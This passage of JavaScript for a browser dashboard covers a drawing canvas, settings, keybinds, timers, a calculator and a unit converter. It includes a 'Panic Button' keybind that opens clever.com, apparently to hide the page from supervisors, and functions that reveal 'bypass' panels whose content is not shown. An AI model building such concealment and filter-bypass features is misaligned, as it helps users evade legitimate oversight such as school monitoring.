            a.download = 'activity_logs.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            logActivity('Downloaded Activity Logs', 'Button Press');
        });

        document.getElementById('dashboardSearch').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const query = e.target.value.toLowerCase();
                const panels = document.querySelectorAll('.info-panel');
                let found = false;
                panels.forEach(panel => {
                    const panelId = panel.id;
                    const panelTitle = panel.querySelector('h2')?.textContent.toLowerCase() || '';
                    if (panelTitle.includes(query) || panelId.includes(query)) {
                        dashboard.togglePanel(panelId, true); // Open if matches
                        panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        found = true;
                        logActivity(`Searched for "${query}", found and opened ${panelId}`, 'Search');
                    } else {
                        dashboard.togglePanel(panelId, false); // Close if not matching
                    }
                });
                if (!found) {
                    alert(`No dashboard section found matching "${e.target.value}"`);
                    logActivity(`Search for "${query}" found no results`, 'Search');
                }
            }
        });
        logActivity('Dashboard buttons initialized', 'Button');
      },
      
      // Initialize canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          document.getElementById('infoPanelsContainer').style.display = 'none'; // Hide info panels too
          canvasContainer.style.display = 'block';
          logActivity('Opened Notes Canvas', 'Panel');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'grid'; // Reset to grid
          document.getElementById('infoPanelsContainer').style.display = 'block'; // Show info panels container
          logActivity('Closed Notes Canvas', 'Panel');
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const brushColorInput = document.getElementById('brushColor');
        const brushThicknessInput = document.getElementById('brushThickness');
        const addTextNoteBtn = document.getElementById('addTextNoteBtn');
        const undoDrawBtn = document.getElementById('undoDrawBtn');
        const redoDrawBtn = document.getElementById('redoDrawBtn');
        const saveCanvasBtn = document.getElementById('saveCanvasBtn');
        const loadCanvasBtn = document.getElementById('loadCanvasBtn');


        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Drawing state
        let drawing = false;
        let brushColor = brushColorInput.value;
        let brushThickness = brushThicknessInput.value;
        let lastX, lastY;

        // Undo/Redo history
        const undoStack = [];
        const redoStack = [];
        const MAX_HISTORY = 20;

        function saveState() {
            if (undoStack.length >= MAX_HISTORY) {
                undoStack.shift(); // Remove oldest state
            }
            undoStack.push(canvas.toDataURL());
            redoStack.length = 0; // Clear redo stack on new action
        }

        function restoreState(stack) {
            if (stack.length > 0) {
                const img = new Image();
                img.onload = () => {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0);
                };
                img.src = stack.pop();
            }
        }

        // Initialize canvas background (important for export/save)
        function initCanvasBackground() {
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            saveState(); // Save initial blank state
        }
        initCanvasBackground();


        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const clientX = evt.clientX || evt.touches[0].clientX;
          const clientY = evt.clientY || evt.touches[0].clientY;
          return {
            x: clientX - rect.left,
            y: clientY - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
            drawing = true;
            const pos = getPos(e);
            [lastX, lastY] = [pos.x, pos.y];
            ctx.beginPath();
            ctx.moveTo(lastX, lastY);
            e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
            drawing = true;
            const pos = getPos(e);
            [lastX, lastY] = [pos.x, pos.y];
            ctx.beginPath();
            ctx.moveTo(lastX, lastY);
            e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
            if (!drawing) return;
            const pos = getPos(e);
            ctx.lineTo(pos.x, pos.y);
            ctx.strokeStyle = brushColor;
            ctx.lineWidth = brushThickness;
            ctx.lineCap = 'round';
            ctx.stroke();
            lastX = pos.x;
            lastY = pos.y;
            e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
            if (!drawing) return;
            const pos = getPos(e);
            ctx.lineTo(pos.x, pos.y);
            ctx.strokeStyle = brushColor;
            ctx.lineWidth = brushThickness;
            ctx.lineCap = 'round';
            ctx.stroke();
            lastX = pos.x;
            lastY = pos.y;
            e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) { // Only save state if actual drawing occurred
                saveState();
                logActivity('User drew on canvas', 'Canvas');
            }
            drawing = false;
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          initCanvasBackground(); // Re-initialize with white background and save state
          logActivity('Cleared canvas', 'Canvas');
        });

        brushColorInput.addEventListener('change', (e) => {
            brushColor = e.target.value;
            logActivity(`Changed brush color to ${brushColor}`, 'Canvas');
        });

        brushThicknessInput.addEventListener('change', (e) => {
            brushThickness = parseInt(e.target.value);
            logActivity(`Changed brush thickness to ${brushThickness}`, 'Canvas');
        });

        addTextNoteBtn.addEventListener('click', () => {
            const text = prompt("Enter text for note:");
            if (text) {
                const x = Math.random() * (canvas.width - 200) + 100; // Random x position
                const y = Math.random() * (canvas.height - 50) + 25; // Random y position
                ctx.font = `${brushThickness * 2}px Arial`;
                ctx.fillStyle = brushColor;
                ctx.fillText(text, x, y);
                saveState();
                logActivity(`Added text note: "${text}"`, 'Canvas');
            }
        });

        undoDrawBtn.addEventListener('click', () => {
            if (undoStack.length > 1) { // Keep at least one initial blank state
                redoStack.push(undoStack.pop()); // Move current state to redo
                restoreState(undoStack);
                logActivity('Undid last canvas action', 'Canvas');
            }
        });

        redoDrawBtn.addEventListener('click', () => {
            if (redoStack.length > 0) {
                undoStack.push(redoStack.pop()); // Move state back to undo
                restoreState(undoStack); // Restore it
                logActivity('Redid last canvas action', 'Canvas');
            }
        });

        saveCanvasBtn.addEventListener('click', () => {
            const dataURL = canvas.toDataURL();
            localStorage.setItem('savedCanvas', dataURL);
            alert('Canvas saved locally!');
            logActivity('Saved canvas state locally', 'Canvas');
        });

        loadCanvasBtn.addEventListener('click', () => {
            const dataURL = localStorage.getItem('savedCanvas');
            if (dataURL) {
                const img = new Image();
                img.onload = () => {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0);
                    undoStack.length = 0; // Clear undo/redo history for loaded canvas
                    redoStack.length = 0;
                    saveState(); // Save the loaded state
                    alert('Canvas loaded from local storage!');
                    logActivity('Loaded canvas state from local storage', 'Canvas');
                };
                img.src = dataURL;
            } else {
                alert('No saved canvas found!');
            }
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.body;
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            logActivity('Took a screenshot of the dashboard', 'Screenshot');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          logActivity('Exported Notes Canvas as PNG', 'Canvas');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          const mainGrid = document.getElementById('mainGrid');
          const infoPanelsContainer = document.getElementById('infoPanelsContainer');
          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'grid'; // Changed to grid
            infoPanelsContainer.style.display = 'block';
            toggleBtn.innerText = '‚¨ÜÔ∏è Toggle Sections';
            logActivity('Toggled sections ON', 'Toggle');
          } else {
            mainGrid.style.display = 'none';
            infoPanelsContainer.style.display = 'none';
            toggleBtn.innerText = '‚¨áÔ∏è Toggle Sections';
            logActivity('Toggled sections OFF', 'Toggle');
          }
        });
        logActivity('Canvas functionality initialized', 'Canvas');
      },
      
      // Initialize panels and their draggable functionality
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        logActivity('All info panels hidden initially', 'Panel');
      },

      initPanelDragging: function() {
        let activeDraggable = null;
        let initialX, initialY;
        let xOffset = 0, yOffset = 0;

        document.querySelectorAll('.box, .info-panel').forEach(panel => {
            // Ensure position is absolute or relative for offset top/left to work correctly
            panel.style.position = 'relative'; // Default to relative, can be changed dynamically if dragging outside initial flow
        });

        document.addEventListener('mousedown', dragStart);
        document.addEventListener('mouseup', dragEnd);
        document.addEventListener('mousemove', drag);

        function dragStart(e) {
            const handle = e.target.closest('.drag-handle');
            if (handle) {
                const panel = handle.closest('.box, .info-panel');
                activeDraggable = panel;
                activeDraggable.style.cursor = 'grabbing';

                // Store current position (relative to its current parent/offset parent)
                if (!activeDraggable.style.top || !activeDraggable.style.left) {
                    activeDraggable.style.top = '0px';
                    activeDraggable.style.left = '0px';
                }

                xOffset = e.clientX - activeDraggable.getBoundingClientRect().left;
                yOffset = e.clientY - activeDraggable.getBoundingClientRect().top;

                initialX = e.clientX;
                initialY = e.clientY;

                // Bring to front
                activeDraggable.style.zIndex = '100';
                logActivity(`Started dragging panel: ${activeDraggable.id}`, 'Panel');
            }
        }

        function dragEnd(e) {
            if (activeDraggable) {
                activeDraggable.style.cursor = 'grab';
                activeDraggable.style.zIndex = ''; // Reset z-index
                activeDraggable = null;
                logActivity('Stopped dragging panel', 'Panel');
            }
        }

        function drag(e) {
            if (activeDraggable) {
                e.preventDefault();

                const currentX = e.clientX - xOffset;
                const currentY = e.clientY - yOffset;

                // Update position using CSS top/left
                activeDraggable.style.position = 'absolute'; // Switch to absolute positioning for free movement
                activeDraggable.style.left = `${currentX}px`;
                activeDraggable.style.top = `${currentY}px`;
            }
        }
        logActivity('Panel dragging initialized', 'UI');
      },

      // Panel toggle functions
      togglePanel: function(panelId, forceOpen = null) {
        const panel = document.getElementById(panelId);
        if (!panel) return;

        const isCurrentlyOpen = panel.style.display === 'block';

        if (forceOpen === true) {
            if (!isCurrentlyOpen) {
                panel.style.display = 'block';
                logActivity(`Opened panel: ${panelId} (forced)`, 'Panel');
            }
        } else if (forceOpen === false) {
            if (isCurrentlyOpen) {
                panel.style.display = 'none';
                logActivity(`Closed panel: ${panelId} (forced)`, 'Panel');
            }
        } else { // Toggle behavior
            if (isCurrentlyOpen) {
                panel.style.display = 'none';
                logActivity(`Closed panel: ${panelId}`, 'Panel');
            } else {
                // Close other panels before opening this one, if it's an info-panel type
                document.querySelectorAll('.info-panel').forEach(p => {
                    if (p.id !== panelId && p.style.display === 'block') {
                        p.style.display = 'none';
                        logActivity(`Closed other panel: ${p.id}`, 'Panel');
                    }
                });
                panel.style.display = 'block';
                logActivity(`Opened panel: ${panelId}`, 'Panel');
            }
        }
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        logActivity(`Showed iPad content: ${contentId}`, 'Panel');
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        logActivity(`Showed bypass content: ${contentId}`, 'Panel');
      },

      // Dashboard Search Functionality
      initDashboardSearch: function() {
        // Already handled in initButtons for keydown event
        logActivity('Dashboard search initialized', 'Search');
      },

      // Settings Panel Functionality
      initSettings: function() {
        const themeSelector = document.getElementById('themeSelector');
        const notificationSoundToggle = document.getElementById('notificationSoundToggle');
        const fontSizeSetting = document.getElementById('fontSizeSetting');
        const autoSaveInterval = document.getElementById('autoSaveInterval');
        const enableAnimations = document.getElementById('enableAnimations');
        const showWelcomeNotification = document.getElementById('showWelcomeNotification');
        const dashboardLayout = document.getElementById('dashboardLayout');
        const languageSetting = document.getElementById('languageSetting');
        const timezoneSetting = document.getElementById('timezoneSetting');
        const privacyMode = document.getElementById('privacyMode');

        // Load saved settings
        const settings = JSON.parse(localStorage.getItem('dashboardSettings') || '{}');

        // Apply loaded settings (and set defaults if not found)
        themeSelector.value = settings.theme || document.documentElement.className;
        notificationSoundToggle.checked = settings.notificationSound !== false;
        fontSizeSetting.value = settings.fontSize || '16';
        autoSaveInterval.value = settings.autoSaveInterval || '60';
        enableAnimations.checked = settings.enableAnimations !== false;
        showWelcomeNotification.checked = settings.showWelcomeNotification !== false;
        dashboardLayout.value = settings.dashboardLayout || 'default';
        languageSetting.value = settings.language || 'en';
        timezoneSetting.value = settings.timezone || 'UTC';
        privacyMode.checked = settings.privacyMode || false;

        // Apply font size immediately
        document.body.style.fontSize = `${fontSizeSetting.value}px`;

        // Event Listeners for settings
        themeSelector.addEventListener('change', (e) => {
            document.documentElement.className = e.target.value;
            this.saveSetting('theme', e.target.value);
            logActivity(`Changed theme to ${e.target.value} via settings`, 'Settings');
        });
        notificationSoundToggle.addEventListener('change', (e) => {
            this.saveSetting('notificationSound', e.target.checked);
            logActivity(`Toggled notification sound to ${e.target.checked}`, 'Settings');
        });
        fontSizeSetting.addEventListener('change', (e) => {
            document.body.style.fontSize = `${e.target.value}px`;
            this.saveSetting('fontSize', e.target.value);
            logActivity(`Changed font size to ${e.target.value}px`, 'Settings');
        });
        autoSaveInterval.addEventListener('change', (e) => {
            this.saveSetting('autoSaveInterval', e.target.value);
            logActivity(`Changed auto-save interval to ${e.target.value}s`, 'Settings');
        });
        enableAnimations.addEventListener('change', (e) => {
            this.saveSetting('enableAnimations', e.target.checked);
            logActivity(`Toggled animations to ${e.target.checked}`, 'Settings');
        });
        showWelcomeNotification.addEventListener('change', (e) => {
            this.saveSetting('showWelcomeNotification', e.target.checked);
            logActivity(`Toggled welcome notifications to ${e.target.checked}`, 'Settings');
        });
        dashboardLayout.addEventListener('change', (e) => {
            this.saveSetting('dashboardLayout', e.target.value);
            logActivity(`Changed dashboard layout to ${e.target.value}`, 'Settings');
        });
        languageSetting.addEventListener('change', (e) => {
            this.saveSetting('language', e.target.value);
            logActivity(`Changed language to ${e.target.value}`, 'Settings');
        });
        timezoneSetting.addEventListener('change', (e) => {
            this.saveSetting('timezone', e.target.value);
            logActivity(`Changed timezone to ${e.target.value}`, 'Settings');
        });
        privacyMode.addEventListener('change', (e) => {
            this.saveSetting('privacyMode', e.target.checked);
            logActivity(`Toggled privacy mode to ${e.target.checked}`, 'Settings');
        });

        // Other settings buttons
        document.querySelector('#settingsPanel button.dashboard-grid-button:nth-child(10)').addEventListener('click', () => { alert('Data synced!'); logActivity('Clicked Data Sync', 'Settings'); }); // Sync Now
        document.querySelector('#settingsPanel button.dashboard-grid-button:nth-child(11)').addEventListener('click', () => { alert('Cache cleared!'); logActivity('Clicked Clear Cache', 'Settings'); }); // Clear Cache
        document.querySelector('#settingsPanel button.dashboard-grid-button:nth-child(12)').addEventListener('click', () => {
            const settingsData = localStorage.getItem('dashboardSettings');
            const blob = new Blob([settingsData], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'dashboard_settings.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            logActivity('Exported settings', 'Settings');
        });
        document.querySelector('#settingsPanel button.dashboard-grid-button:nth-child(13)').addEventListener('click', () => {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.accept = 'application/json';
            fileInput.onchange = (e) => {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        try {
                            const importedSettings = JSON.parse(event.target.result);
                            localStorage.setItem('dashboardSettings', JSON.stringify(importedSettings));
                            alert('Settings imported! Please refresh to apply.');
                            logActivity('Imported settings', 'Settings');
                        } catch (error) {
                            alert('Invalid settings file.');
                            logActivity(`Failed to import settings: ${error.message}`, 'Settings');
                        }
                    };
                    reader.readAsText(file);
                }
            };
            fileInput.click();
        });
        document.querySelector('#settingsPanel button.dashboard-grid-button.bg-red-500').addEventListener('click', () => {
            if (confirm('Are you sure you want to reset all settings to default?')) {
                localStorage.removeItem('dashboardSettings');
                alert('Settings reset. Refreshing page...');
                location.reload();
                logActivity('Reset all settings', 'Settings');
            }
        });

        logActivity('Settings panel initialized', 'Settings');
      },

      saveSetting: function(key, value) {
        const settings = JSON.parse(localStorage.getItem('dashboardSettings') || '{}');
        settings[key] = value;
        localStorage.setItem('dashboardSettings', JSON.stringify(settings));
        stats.save(); // Save stats whenever settings are saved
      },

      // Keybinds Panel Functionality
      keybinds: {},
      initKeybinds: function() {
        const keybindsGrid = document.getElementById('keybindsGrid');
        const defaultKeybinds = {
            'Toggle Calendar': 'g',
            'Toggle Settings': 's',
            'Panic Button': 'escape',
            'Open Notes': 'n',
            'Screenshot': 'p',
            'Logout': 'l'
        };

        // Load keybinds from localStorage
        this.keybinds = JSON.parse(localStorage.getItem('dashboardKeybinds') || JSON.stringify(defaultKeybinds));

        for (const action in this.keybinds) {
            const keybindItem = document.createElement('div');
            keybindItem.className = 'keybind-item';
            keybindItem.innerHTML = `
                <span>${action}</span>
                <input type="text" class="keybind-input" value="${this.keybinds[action]}" readonly data-action="${action}">
            `;
            keybindsGrid.appendChild(keybindItem);
        }

        keybindsGrid.addEventListener('click', (e) => {
            const input = e.target.closest('.keybind-input');
            if (input) {
                input.value = 'Press a key...';
                input.focus();
                input.addEventListener('keydown', (keyEvent) => {
                    keyEvent.preventDefault(); // Prevent default browser actions
                    const newKey = keyEvent.key.toLowerCase();
                    input.value = newKey;
                    this.keybinds[input.dataset.action] = newKey;
                    localStorage.setItem('dashboardKeybinds', JSON.stringify(this.keybinds));
                    input.blur(); // Remove focus
                    logActivity(`Set keybind for "${input.dataset.action}" to "${newKey}"`, 'Keybinds');
                }, { once: true }); // Listen only once
            }
        });

        document.addEventListener('keydown', (e) => {
            const pressedKey = e.key.toLowerCase();
            for (const action in this.keybinds) {
                if (this.keybinds[action] === pressedKey) {
                    e.preventDefault(); // Prevent default browser action
                    this.triggerKeybindAction(action);
                    logActivity(`Triggered keybind for "${action}" with key "${pressedKey}"`, 'Keybinds');
                    break;
                }
            }
        });
        logActivity('Keybinds system initialized', 'Keybinds');
      },

      triggerKeybindAction: function(action) {
        switch (action) {
            case 'Toggle Calendar': dashboard.togglePanel('calendarBox'); break;
            case 'Toggle Settings': dashboard.togglePanel('settingsPanel'); break;
            case 'Panic Button': window.open('https://clever.com', '_blank'); break;
            case 'Open Notes': dashboard.togglePanel('notesCanvas'); break; // Corrected to canvas element
            case 'Screenshot': document.getElementById('screenshotBtn').click(); break;
            case 'Logout': document.getElementById('logoutBtn').click(); break;
            // Add more actions as needed
            default: console.log(`Keybind action "${action}" not implemented.`);
        }
      },

      // Timer & Stopwatch Panel Functionality
      stopwatchInterval: null,
      stopwatchSeconds: 0,
      timerInterval: null,
      timerSeconds: 0,
      initTimerStopwatch: function() {
        const stopwatchDisplay = document.getElementById('timerDisplay');
        const startStopwatchBtn = document.getElementById('startStopwatchBtn');
        const stopStopwatchBtn = document.getElementById('stopStopwatchBtn');
        const resetStopwatchBtn = document.getElementById('resetStopwatchBtn');

        const countdownInput = document.getElementById('countdownInput');
        const countdownDisplay = document.getElementById('countdownDisplay');
        const startTimerBtn = document.getElementById('startTimerBtn');
        const stopTimerBtn = document.getElementById('stopTimerBtn');
        const resetTimerBtn = document.getElementById('resetTimerBtn');

        const formatTime = (totalSeconds) => {
            const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
            const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
            const s = String(totalSeconds % 60).padStart(2, '0');
            return `${h}:${m}:${s}`;
        };

        // Stopwatch
        startStopwatchBtn.addEventListener('click', () => {
            if (!this.stopwatchInterval) {
                this.stopwatchInterval = setInterval(() => {
                    this.stopwatchSeconds++;
                    stopwatchDisplay.textContent = formatTime(this.stopwatchSeconds);
                }, 1000);
                logActivity('Started stopwatch', 'Timer');
            }
        });
        stopStopwatchBtn.addEventListener('click', () => {
            clearInterval(this.stopwatchInterval);
            this.stopwatchInterval = null;
            logActivity('Stopped stopwatch', 'Timer');
        });
        resetStopwatchBtn.addEventListener('click', () => {
            clearInterval(this.stopwatchInterval);
            this.stopwatchInterval = null;
            this.stopwatchSeconds = 0;
            stopwatchDisplay.textContent = formatTime(this.stopwatchSeconds);
            logActivity('Reset stopwatch', 'Timer');
        });

        // Countdown Timer
        startTimerBtn.addEventListener('click', () => {
            if (!this.timerInterval) {
                let initialSeconds = parseInt(countdownInput.value);
                if (isNaN(initialSeconds) || initialSeconds <= 0) {
                    this.showAlert('Please set a valid timer duration.', 'warning');
                    return;
                }
                this.timerSeconds = initialSeconds;
                countdownDisplay.textContent = formatTime(this.timerSeconds);

                this.timerInterval = setInterval(() => {
                    this.timerSeconds--;
                    countdownDisplay.textContent = formatTime(this.timerSeconds);
                    if (this.timerSeconds <= 0) {
                        clearInterval(this.timerInterval);
                        this.timerInterval = null;
                        this.showAlert('Timer finished!', 'success');
                        logActivity('Timer finished', 'Timer');
                    }
                }, 1000);
                logActivity(`Started timer for ${initialSeconds} seconds`, 'Timer');
            }
        });
        stopTimerBtn.addEventListener('click', () => {
            clearInterval(this.timerInterval);
            this.timerInterval = null;
            logActivity('Stopped timer', 'Timer');
        });
        resetTimerBtn.addEventListener('click', () => {
            clearInterval(this.timerInterval);
            this.timerInterval = null;
            this.timerSeconds = 0;
            countdownDisplay.textContent = formatTime(this.timerSeconds);
            countdownInput.value = '60'; // Reset input as well
            logActivity('Reset timer', 'Timer');
        });
        logActivity('Timer and Stopwatch initialized', 'Timer');
      },

      // Alert System for Dashboard Notifications (without sound)
      showAlert: function(message, type = 'info', duration = 3000) {
        const notification = document.getElementById('dashboardNotification');
        const notificationMessage = document.getElementById('notificationMessage');
        const closeBtn = notification.querySelector('.close-btn');

        notificationMessage.textContent = message;
        // Apply type-specific styling if needed (e.g., color for success/warning/error)
        notification.style.backgroundColor = {
            'info': 'hsl(var(--accent-color))',
            'success': '#2ecc71',
            'warning': '#f1c40f',
            'error': '#e74c3c'
        }[type] || 'hsl(var(--primary-color))';
        notification.style.color = type === 'warning' ? '#333' : 'white'; // Darker text for yellow warning

        notification.classList.add('show');
        logActivity(`Displayed dashboard alert: "${message}" (${type})`, 'Alert');

        const hideAlert = () => {
            notification.classList.remove('show');
        };

        if (duration > 0) {
            setTimeout(hideAlert, duration);
        }

        closeBtn.onclick = hideAlert; // Allow manual closing
      },

      // Activity Logs Panel (Dashboard)
      updateActivityLogs: function() {
        const activityLogContent = document.getElementById('activityLogContent');
        activityLogContent.value = activityLog.join('\n');
        activityLogContent.scrollTop = activityLogContent.scrollHeight; // Scroll to bottom
      },

      // Login History Panel (Dashboard)
      loadLoginHistory: function() {
        const loginHistoryContent = document.getElementById('loginHistoryContent');
        const storedHistory = JSON.parse(localStorage.getItem('loginHistory') || '[]');
        loginHistory = storedHistory; // Update the in-memory array
        if (loginHistory.length > 0) {
            loginHistoryContent.value = loginHistory.map(entry => `Logged in: ${entry.time} | User: ${entry.user} | ID: ${entry.id}`).join('\n');
        } else {
            loginHistoryContent.value = 'No login history found.';
        }
        logActivity('Login history loaded', 'System');
      },

      addLoginToHistory: function(username, userID) {
        const now = new Date();
        const entry = {
            time: now.toLocaleString(),
            user: username,
            id: userID
        };
        loginHistory.push(entry);
        localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
        logActivity(`Added new login to history: ${username} (${userID})`, 'Login History');
      },

      // Random Facts and Daily Quotes
      randomFacts: [
        "The shortest war in history lasted only 38 to 45 minutes.",
        "A group of owls is called a parliament.",
        "Honey never spoils.",
        "The Earth's atmosphere is made of 78% nitrogen.",
        "Mount Everest grows by about 4 millimeters every year.",
        "Bananas are berries, but strawberries are not.",
        "There are more possible chess games than atoms in the observable universe.",
        "A jiffy is an actual unit of time: 1/100th of a second.",
        "Wombat poop is cube-shaped.",
        "The total weight of all ants on Earth is thought to be about the same as the total weight of all humans."
      ],
      dailyQuotes: [
        "The only way to do great work is to love what you do. ‚Äì Steve Jobs",
        "Believe you can and you're halfway there. ‚Äì Theodore Roosevelt",
        "The future belongs to those who believe in the beauty of their dreams. ‚Äì Eleanor Roosevelt",
        "It is during our darkest moments that we must focus to see the light. ‚Äì Aristotle Onassis",
        "Strive not to be a success, but rather to be of value. ‚Äì Albert Einstein",
        "The best way to predict the future is to create it. ‚Äì Peter Drucker",
        "The only limit to our realization of tomorrow will be our doubts of today. ‚Äì Franklin D. Roosevelt",
        "Innovation distinguishes between a leader and a follower. ‚Äì Steve Jobs",
        "Life is 10% what happens to us and 90% how we react to it. ‚Äì Charles R. Swindoll",
        "The mind is everything. What you think you become. ‚Äì Buddha"
      ],
      displayRandomFact: function() {
        const factContent = document.getElementById('randomFactContent');
        const randomIndex = Math.floor(Math.random() * this.randomFacts.length);
        factContent.textContent = this.randomFacts[randomIndex];
        logActivity('Displayed a random fact', 'Content');
      },
      displayDailyQuote: function() {
        const quoteContent = document.getElementById('dailyQuoteContent');
        const randomIndex = Math.floor(Math.random() * this.dailyQuotes.length);
        quoteContent.textContent = this.dailyQuotes[randomIndex];
        logActivity('Displayed a daily quote', 'Content');
      },

      // Calculator Panel
      initCalculator: function() {
        const display = document.getElementById('calcDisplay');
        const buttons = document.querySelectorAll('#calculatorPanel .calc-grid button');
        let currentInput = '0';
        let operator = null;
        let prevInput = null;
        let resetDisplay = false;

        const updateDisplay = () => {
            display.value = currentInput;
        };

        buttons.forEach(button => {
            button.addEventListener('click', () => {
                const value = button.textContent;
                logActivity(`Calculator button pressed: ${value}`, 'Calculator');

                if (value >= '0' && value <= '9') {
                    if (currentInput === '0' || resetDisplay) {
                        currentInput = value;
                        resetDisplay = false;
                    } else {
                        currentInput += value;
                    }
                } else if (value === '.') {
                    if (resetDisplay) {
                        currentInput = '0.';
                        resetDisplay = false;
                    } else if (!currentInput.includes('.')) {
                        currentInput += '.';
                    }
                } else if (value === 'C') {
                    currentInput = '0';
                    operator = null;
                    prevInput = null;
                    resetDisplay = false;
                } else if (value === '+/-') {
                    currentInput = (parseFloat(currentInput) * -1).toString();
                } else if (value === '%') {
                    currentInput = (parseFloat(currentInput) / 100).toString();
                } else if (['/', '*', '-', '+'].includes(value)) {
                    if (prevInput !== null && operator !== null && !resetDisplay) {
                        this.calculate();
                    }
                    operator = value;
                    prevInput = currentInput;
                    resetDisplay = true;
                } else if (value === '=') {
                    if (prevInput !== null && operator !== null) {
                        this.calculate();
                        operator = null;
                        prevInput = null;
                        resetDisplay = true;
                    }
                }
                updateDisplay();
            });
        });

        this.calculate = () => {
            let result;
            const prev = parseFloat(prevInput);
            const current = parseFloat(currentInput);
            if (isNaN(prev) || isNaN(current)) return;

            switch (operator) {
                case '+': result = prev + current; break;
                case '-': result = prev - current; break;
                case '*': result = prev * current; break;
                case '/': result = prev / current; break;
                default: return;
            }
            currentInput = result.toString();
            updateDisplay();
        };
        logActivity('Calculator initialized', 'Calculator');
      },

      // Unit Converter Panel
      units: {
        meters: {
          feet: 3.28084,
          cm: 100
        },
        feet: {
          meters: 0.3048,
          cm: 30.48
        },
        cm: {
          meters: 0.01,
          feet: 0.0328084
        }
      },
      convertUnit: function() {
        const inputVal = parseFloat(document.getElementById('convertInput').value);
        const fromUnit = document.getElementById('convertFrom').value;
        const toUnit = document.getElementById('convertTo').value;
        const outputField = document.getElementById('convertOutput');

        if (isNaN(inputVal)) {
          outputField.value = 'Invalid Input';
          logActivity('Unit converter: Invalid input', 'Unit Converter');
          return;
        }

        if (fromUnit === toUnit) {
          outputField.value = inputVal;
          logActivity(`Unit converter: converted ${inputVal} ${fromUnit} to ${toUnit}`, 'Unit Converter');
          return;
        }

        if (this.units[fromUnit] && this.units[fromUnit][toUnit]) {
          outputField.value = (inputVal * this.units[fromUnit][toUnit]).toFixed(4);
          logActivity(`Unit converter: converted ${inputVal} ${fromUnit} to ${outputField.value} ${toUnit}`, 'Unit Converter');
        } else {
          outputField.value = 'Conversion Not Available';
          logActivity(`Unit converter: Conversion from ${fromUnit} to ${toUnit} not available`, 'Unit Converter');
        }
      },
      initUnitConverter: function() {
        document.getElementById('convertFrom').addEventListener('change', () => logActivity(`Unit converter "from" changed`, 'Unit Converter'));
        document.getElementById('convertTo').addEventListener('change', () => logActivity(`Unit converter "to" changed`, 'Unit Converter'));
        document.getElementById('convertInput').addEventListener('input', () => logActivity(`Unit converter input changed`, 'Unit Converter'));
        logActivity('Unit converter initialized', 'Unit Converter');
      },

      // Stats Panel
      updateStats: function() {
        document.getElementById('statButtonsPressed').textContent = stats.buttonsPressed;
        document.getElementById('statTogglesUsed').textContent = stats.togglesUsed;
        document.getElementById('statPanelsOpened').textContent = stats.panelsOpened;
        document.getElementById('statPanelsClosed').textContent = stats.panelsClosed;
        document.getElementById('statCanvasDraws').textContent = stats.canvasDraws;
        document.getElementById('statThemeChanges').textContent = stats.themeChanges;
        stats.save(); // Save stats to localStorage on every update
      },
      initStats: function() {
        // Stats are updated in logActivity and on theme changes
        logActivity('Stats panel initialized', 'Stats');
      },

      // Media Panel
      initMediaPlayer: function() {
        const youtubeUrlInput = document.getElementById('youtubeUrlInput');
        const loadYoutubeBtn = document.getElementById('loadYoutubeBtn');
        const mediaFrame = document.getElementById('mediaFrame');

        loadYoutubeBtn.addEventListener('click', () => {
            const url = youtubeUrlInput.value;
            let videoId;

            if (url.includes('youtube.com/watch?v=')) {
                videoId = url.split('v=')[1].split('&')[0];
